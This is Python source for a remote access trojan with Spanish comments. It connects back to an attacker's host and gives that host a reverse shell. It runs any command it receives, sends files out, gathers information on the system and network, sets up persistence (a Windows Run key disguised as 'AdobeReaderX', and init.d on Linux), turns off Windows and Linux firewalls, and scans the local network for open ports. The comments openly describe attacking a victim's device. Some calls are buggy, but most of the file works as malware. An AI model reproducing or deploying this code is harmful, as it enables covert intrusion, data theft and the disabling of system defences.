# -*- coding: UTF-8 -*-

"""IMPORTAMOS LOS MÓDULOS QUE VAN A SER NECESARIOS"""
import os
import sys
import platform
import socket as socket
import subprocess
import getpass
import uuid
import urllib
import time
import ctypes
try:
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
except:
    pass

    
"""ARBOL/ESTRUCTURA DEL PROGRAMA"""
#SYSTEM-----SHELL INVERSA                       V
#   |    |__OS INFO                             V
#   |
#   |
#   |---WINDOWS
#   |      |---PERSISTENCIA                     V
#   |      |---FIREWALL  (AS ADMIN)             V
#   |      |___NET SCANNER                      V
#   |
#   |---LINUX
#         |---PERSISTENCIA                      V 
#         |---FIREWALL/IPTABLES/UFW (AS ADMIN)  V
#         |___NET SCANNER                       V
#   

##############################################################################
##############################################################################
##############################################################################

"""PERMISOS DE ADMINISTRADOR"""
# try:
    # is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    # if is_admin != 1:
        # print 'Necesita permisos de administrador.'
        # sys.exit
# except:
    # is_admin = os.getuid()
    # if is_admin != 0:
        # print 'Necesita permisos de administrador'
        # sys.exit

#########
#GENERAL#
#########

def System():
    """Sistema operativo que vamos a atacar
    Dividimos el script en dos, Linux y Windows
    para ejecutar unas u otras funciones"""
    if (sys.platform.startswith('win32')
        or sys.platform.startswith('cygwin')):
        PLAT_SYS = 'windows'
    elif sys.platform.startswith('linux'):
        PLAT_SYS = 'linux'
    else:
        PLAT_SYS = 'unknown'
    return PLAT_SYS



def os_info():
    """Información del sistema operativo"""
    #SISTEMA OPERATIVO
    sys_platform = platform.platform()
    proces    = platform.processor()
    arch = platform.architecture()[0]
    
    
    
    #USUARIO EN SESIÓN
    user = getpass.getuser()
    
    
    
    #RED
    hostname    = socket.gethostname()
    fqdn        = socket.getfqdn()
    internal_ip = socket.gethostbyname(hostname)
    raw_mac     = uuid.getnode()
    mac         = (':'.join(('%012X' % raw_mac)[i:i+2] 
                   for i in range(0, 12, 2)))
                   
                   
                   
    #IP EXTERNA
    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw',
                   'wtfismyip.com/text' ]
    external_ip = ''
    
    
    
    for url in ex_ip_grab:
        try:
            external_ip = urllib.urlopen('http://'+url).read().rstrip()
        except IOError:
            pass
        if external_ip and (6 < len(external_ip) < 16):
            break
            
            

    # DATATIME DEL DISPOSITIVO
    dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
         time.localtime())
    all_val = ([sys_platform, proces, arch, user, hostname, mac,
                internal_ip, external_ip, dt])
    all=''
    
    
    
    for i in all_val:
        all=all+' '+i
    return all
    



##############################################################################
##############################################################################
##############################################################################

#########
#WINDOWS#
#########
def windows_persistence():
    """Creación de la persistencia en el dispositivo infectado
    Creamos una entrada en el registro para que se autoejecute
    al arrancar el dispositivo"""
    tempdir = '%TEMP%'
    fileName = sys.argv[0]
    dir,file = os.path.split(fileName)
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    
    """Copia este ejecutable a la ruta indicada"""
    try:
        os.system('copy %s %s'%(fileName, tempdir))
        bin_path = sys.executable
    except:
        pass

        
    """Crea un registro que ejecute, bajo el nombre de
    AdobeReaderX el archivo copiado anteriormente a %TEMP%"""
    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'AdobeReaderX', 0, _winreg.REG_SZ,
                (r"%TEMP%"+file))
        _winreg.CloseKey(reg_key)
        return True
    except WindowsError:
        return False



def windows_firewall():
    """Desactivación del firewall"""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin()

    
    """Si es administrador, desactiva el firewall"""
    if is_admin == 1:
        try:
            subprocess.check_call('netsh.exe advfirewallset',
                ' allprofiles state off')
            return True
        except:
            return False



def windows_scanner():
    """Escaner de red para ver qué dispositivos y
    qué puertos tiene abiertos"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0].split('.')
    s.close()

    

    """Creamos las variables"""
    ips = []
    ips_on = []
    ip_port_on = []
    PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
    514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]
    
    
    
    """Nos quedamos con los tres primeros valores de la
    IP para concatenarlo con valores desde 1 hasta 255
    (Ejemplo:192.168.1.1-255)"""
    for i in range(1,256):
        ip_full = str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+str(i))
        ips.append(ip_full)

        
        
    """Escaneamos las IP's que hemos añadido al array
    en el bucle anterior"""
    for ip in ips:
        print 'Scanning ',ip
        output = subprocess.Popen(["ping", "-n ", "1", ip],
                stdout = subprocess.PIPE).communicate()[0]
        
        if ('inaccesible in output'):
            pass
        else:
            ips_on.append(ip)

            

    """Escaneamos los puertos definidos en la variables
    PORTS. Estos son los más comunes (vulnerables)"""
    for ip_on in ips_on:
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip_on,port))
                print 'IP ',ip_on,'Puerto ',port, ' abierto'
                ip_port_on.append(ip_on+'_'+str(port))
            except:
                pass
            finally:
                s.close()
    return ip_port_on



##############################################################################
##############################################################################
##############################################################################

#######
#LINUX#
#######
def linux_scanner():
    """Escaner de red para ver qué dispositivos y
    qué puertos tiene abiertos"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0].split('.')
    s.close()
    
    
    
    """Creamos las variables"""
    ips = []
    ips_on = []
    ip_port_on = []
    PORTS = [ 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 179, 443, 445,
    514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888 ]

    
    
    """Nos quedamos con los tres primeros valores de la
    IP para concatenarlo con valores desde 1 hasta 255
    (Ejemplo:192.168.1.1-255)"""
    for i in range(1,255):
        ip_full = str(ip[0]+'.'+ip[1]+'.'+ip[2]+'.'+str(i))
        ips.append(ip_full)

        
        
    """Escaneamos las IP's que hemos añadido al array
    en el bucle anterior"""
    for ip in ips:
        res = subprocess.call(['ping', '-c', '1', ip],
            stdout = subprocess.PIPE)
        if res == 0:
            ips_on.append(ip)
        elif res == 2:
            continue
        else:
            continue

            
            
    """Escaneamos los puertos definidos en la variables
    PORTS. Estos son los más comunes (vulnerables)"""
    for ip_on in ips_on:
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip_on,port))
                print 'IP ',ip_on,'Puerto ',port, ' abierto'
                ip_port_on.append(ip_on+'_'+str(port))
            except:
                pass
            finally:
                s.close()
    return ip_port_on



def linux_firewall():
    """Desactivación del firewall"""
    is_admin = os.getuid()
    
    
    
    """Si es administrador, desactiva el firewall y
    otras medidas de seguridad"""
    if is_admin == 0:
        try:
            subprocess.check_call('sudo systemctl stop firewalld ||',
                ' systemctl stop iptables ||',' systemctl stop ufw')
            return True
        except:
            return False
            pass

    else:
        return False



def linux_persistence():
    """Creación de la persistencia en el dispositivo infectado"""
    """Creamos las variables"""
    initdir = '/etc/init.d/'
    fileName = sys.argv[0]
    dir,file = os.path.split(fileName)
    
    
    
    """Intentamos copiar el fichero al directorio /init.d/
    Le damos permisos de ejecución y actualizamos el
    arranque de servicios"""
    try:
        os.system('sudo cp %s %s'%(fileName, initdir))
        os.system('sudo chmod +x /etc/init.d/%s'%(file))
        os.system('sudo update-rc.d %s defaults'%(file))
        return True
    except:
        return False

##############################################################################
##############################################################################
##############################################################################

#######
#SHELL#
#######
def shell():
    """Shell inversa, victima se conecta a atacante"""
    """Definimos las variables IP y HOST"""
    RHOST = '127.0.0.1'
    RPORT = 443
    
    
    
    """Creamos una conexión a través de TCP e IPv4
    y nos conectamos al host:puerto indicado anteriormente"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    
    
    

    try:
        """Recibe información constantemente gracias
        al bucle infinito. La respuesta del programa
        dependerá de lo que haya recibido en ese mensaje"""
        while True:
            data = s.recv(1024)
            """Quit cierra el programa"""
            if data == 'quit':
                s.close()



            """Os info muestra información del sistema"""
            elif data == 'os info':
                os_information = str(os_info())
                s.send(os_information)

                

            """Persistence crea la persistencia"""
            elif data == 'persistence':
                if System() == 'windows':
                    if windows_persistence() == True:
                        s.send('Persistencia completada')
                    else:
                        s.send('No se pudo realizar la persistencia')
                elif System() == 'linux':
                    if linux_persistence() == True:
                        s.send('Persistencia completada')
                    else:
                        s.send('No se pudo realizar la persistencia')
                else:
                    pass

                    

            """Firewall desactiva el firewall"""
            elif data == 'firewall':
                if System() == 'windows':
                    if windows_firewall() == True:
                        s.send('Se desactivó satisfactoriamente')
                    else:
                        s.send('No se pudo desactivar')
                elif System() == 'linux':
                    if linux_firewall() == True:
                        s.send('Se desactivó satisfactoriamente')
                    else:
                        s.send('No se pudo desactivar')
                else:
                    pass

                    

            """Scanner escanea toda la red y los puertos
            de los dispositivos conectados"""
            elif data == 'scanner':
                if System() == 'windows':
                    result_scan=str(windows_scanner())
                    s.send(result_scan)
                elif System() == 'linux':
                    result_scan=str(linux_scanner())
                    s.send(result_scan)
                else:
                    pass
            
            
            
            """Download envía el fichero que el atacante
            ha solicitado descargar"""
            elif data.split(' ')[0]  == 'download':
                file = data.split(' ')[1] 
                #print file
                f = open(file,'rb')
                lineas = f.read(1024)
                while (lineas):
                    s.send(lineas)
                    lineas=f.read(1024)
                    if len(lineas) == 0:
                        break
                f.close()


                
            # elif data.split(' ')[0]  == 'upload':
                # #download <fichero_objetivo>
                # file = data.split(' ')[1]
                # dir, filename = os.path.split(file)
                # downloadDir = data.split(' ')[2]
                
                # buffer = 1024
                # data = s.recv(buffer)
                # with open(os.path.join(downloadDir,filename), 'wb') as f:
                    # while len(data) >= 0:
                        # if len(data) < buffer:
                            # #ULTIMO PAQUETE
                            # f.write(data)
                            # break
                        # else:
                            # f.write(data)
                            # data = s.recv(buffer)
                    # f.close()
                
                
                
            """En cualquier otro caso, ejecuta el comando que ha recibido"""
            else:
                comm = subprocess.Popen(str(data), shell=True, 
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
    
    

            """En caso de que ya se haya enviado el valor de la variable STDOUT
            o STDERR, simplemente lo ignora y se lo salta."""
            try:
                s.send(STDOUT+STDERR)
            except:
                pass
                
                
            
            """Una vez ejecutada la orden que el atacante ha introducido,
            se vuelve a solicitar otro mensaje entrante, es decir, otra orden."""
            
            
            
        """Cerramos la conexión."""    
        s.close()
        
        
        
    """Si ha habido un error en algún momento
    cerramos el programa por completo"""    
    except:
        sys.exit
        pass

        

"""Llamamos a la shell para que se ejecute todo el programa"""
shell()
